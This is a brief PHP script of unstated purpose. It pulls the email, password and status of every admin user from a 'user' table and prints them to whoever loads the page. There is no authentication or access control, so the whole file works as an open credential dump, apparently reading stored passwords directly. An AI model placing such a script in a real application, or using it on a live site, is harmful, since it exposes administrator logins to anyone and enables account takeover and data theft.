<?php
require_once '../config.php';
$res = mysqli_query($con, "SELECT email, password, status FROM user WHERE role='admin'");
while($row = mysqli_fetch_assoc($res)) {
    echo "Email: " . $row['email'] . " | Password: " . $row['password'] . " | Status: " . $row['status'] . "\n";
}
?>
